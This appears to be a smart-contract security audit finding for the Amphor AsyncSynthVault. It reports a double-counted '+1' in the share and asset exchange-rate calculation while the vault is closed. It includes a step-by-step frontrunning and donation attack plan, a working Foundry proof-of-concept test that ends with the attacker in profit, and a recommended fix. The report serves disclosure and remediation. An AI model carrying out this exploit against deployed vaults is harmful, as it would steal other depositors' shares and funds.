Attractive Tin Carp

high

# Exchange rate is calculated incorrectly when the vault is closed, potentially leading to funds being stolen

## Summary
The exchange ratio between shares and assets is calculated incorrectly when the vault is closed. This can cause accounting inconsistencies, funds being stolen and users being unable to redeem shares.

## Vulnerability Detail
The functions [AsyncSynthVault::_convertToAssets](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L907-L908) and [AsyncSynthVault::_convertToShares](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L887-L890) both add `1` to the epoch cached variables `totalAssetsSnapshotForDeposit`, `totalSupplySnapshotForDeposit`, `totalAssetsSnapshotForRedeem` and `totalSupplySnapshotForRedeem`. 

This is incorrect because the function [previewSettle](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L626), used in [_settle()](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L786), already adds `1` to the variables:
```solidity
...
uint256 totalAssetsSnapshotForDeposit = _lastSavedBalance + 1;
uint256 totalSupplySnapshotForDeposit = totalSupply + 1;
...
uint256 totalAssetsSnapshotForRedeem = _lastSavedBalance + pendingDeposit + 1;
uint256 totalSupplySnapshotForRedeem = totalSupply + sharesToMint + 1;
...
```

This leads to accounting inconsistencies between depositing/redeeming when a vault is closed and depositing/redeeming when a vault is open whenever the exchange ratio assets/shares is not exactly 1:1.

If a share is worth more than one asset:
- Users that will request a deposit while the vault is closed will receive **more** shares than they should
- Users that will request a redeem while the vault is closed will receive **less** assets than they should

### POC
This can be taken advantage of by an attacker by doing the following:
1. The attacker monitors the mempool for a vault deployment.
2. Before the vault is deployed the attacker transfers to the vault some of the vault underlying asset (donation). This increases the value of one share.
3. The protocol team initializes the vault and adds the bootstrap liquidity.
4. Users use the protocol normally and deposits some assets.
5. The vault gets closed by the protocol team and the funds invested.
6. Some users request a deposit while the vault is closed.
7. The attacker monitors the mempool to know when the vault will be open again.
8. Right before the vault is opened, the attacker performs multiple deposit requests with different accounts. For each account he deposits the minimum amount of assets required to receive 1 share.
9. The vault opens.
10. The attacker claims all of the deposits with every account and then redeems the shares immediately for profit.

This will "steal" shares of other users (point `6`) from the claimable silo because the protocol will give the attacker more shares than it should. The attacker will profit and some users won't be able to claim their shares.

Add imports to `TestClaimRedeem.t.sol`:
```solidity
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
```
and copy-paste:
```solidity
function test_attackerProfitsViaRequestingDeposits() external {
    address attacker = makeAddr("attacker");
    address protocolUsers = makeAddr("alice");
    address vaultOwner = vaultTested.owner();

    uint256 donation = 1e18 - 1;
    uint256 protocolUsersDeposit = 10e18 + 15e18;
    uint256 protocolTeamBootstrapDeposit = 1e18;

    IERC20 asset = IERC20(vaultTested.asset());
    deal(address(asset), protocolUsers, protocolUsersDeposit);
    deal(address(asset), attacker, donation);
    deal(address(asset), vaultOwner, protocolTeamBootstrapDeposit);

    vm.prank(vaultOwner);
    asset.approve(address(vaultTested), type(uint256).max);

    vm.prank(protocolUsers);
    asset.approve(address(vaultTested), type(uint256).max);

    vm.prank(attacker);
    asset.approve(address(vaultTested), type(uint256).max);

    //-> Attacker donates `1e18 - 1` assets, this can be done before the vault is even deployed
    vm.prank(attacker);
    asset.transfer(address(vaultTested), donation);

    //-> Protocol team bootstraps the vault with `1e18` of assets
    vm.prank(vaultOwner);
    vaultTested.deposit(protocolTeamBootstrapDeposit, vaultOwner);
    
    //-> Users deposit `10e18` of liquidity in the vault
    vm.prank(protocolUsers);
    vaultTested.deposit(10e18, protocolUsers);

    //-> Vault gets closed
    vm.prank(vaultOwner);
    vaultTested.close();

    //-> Users request deposits for `15e18` assets
    vm.prank(protocolUsers);
    vaultTested.requestDeposit(15e18, protocolUsers, protocolUsers, "");

    //-> The attacker frontruns the call to `open()` and knows that:
    //- The current epoch cached `totalSupply` of shares will be `vaultTested.totalSupply()` + 1 + 1
    //- The current epoch cached `totalAssets` will be 12e18 + 1 + 1
    uint256 totalSupplyCachedOnOpen = vaultTested.totalSupply() + 1 + 1; //Current supply of shares, plus 1 used as virtual share, plus 1 added by `_convertToAssets`
    uint256 totalAssetsCachedOnOpen = vaultTested.lastSavedBalance() + 1 + 1; //Total assets passed as paremeter to `open`, plus 1 used as virtual share, plus 1 added by `_convertToAssets`
    uint256 minToDepositToGetOneShare = totalAssetsCachedOnOpen / totalSupplyCachedOnOpen;

    //-> Attacker frontruns the call to `open()` by requesting a deposit with multiple fresh accounts
    uint256 totalDeposited = 0;
    for(uint256 i = 0; i < 30; i++) {
        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones
        deal(address(asset), attackerEOA, minToDepositToGetOneShare);
        vm.startPrank(attackerEOA);
        asset.approve(address(vaultTested), type(uint256).max);
        vaultTested.requestDeposit(minToDepositToGetOneShare, attackerEOA, attackerEOA, "");
        vm.stopPrank();
        totalDeposited += minToDepositToGetOneShare;
    }

    //->Vault gets opened again with 0 profit and 0 losses (for simplicity)
    vm.startPrank(vaultOwner);
    vaultTested.open(vaultTested.lastSavedBalance());
    vm.stopPrank();

    //-> Attacker claims his deposits and withdraws them immediately for profit
    uint256 totalRedeemed = 0;
    for(uint256 i = 0; i < 30; i++) {
        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones
        vm.startPrank(attackerEOA);
        vaultTested.claimDeposit(attackerEOA);
        uint256 assets = vaultTested.redeem(vaultTested.balanceOf(attackerEOA), attackerEOA, attackerEOA);
        vm.stopPrank();
        totalRedeemed += assets;
    }

    //->❌ Attacker is in profit
    assertGt(totalRedeemed, totalDeposited + donation);
}
```

## Impact
When the ratio between shares and assets is not 1:1 the protocol calculates the exchange rate between assets and shares inconsitently. This is an issue by itself and can lead to loss of funds and users not being able to claim shares. It can also be taken advantage of by an attacker to steal shares from the claimable silo.

Note that the "donation" done initially is not akin to an "inflation" attack because the attacker is not required to mint any share.

## Code Snippet

## Tool used

Manual Review

## Recommendation
In the functions [AsyncSynthVault::_convertToAssets](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L907-L908) and [AsyncSynthVault::_convertToShares](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L887-L890):
- Return `0` if `requestId == 0`
- Don't add `1` to the two cached variables

It's also a good idea to perform the initial bootstrapping deposit in the [initialize](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L181) function (as suggested in another finding) and require that the vault contains `0` assets when the first deposit is performed.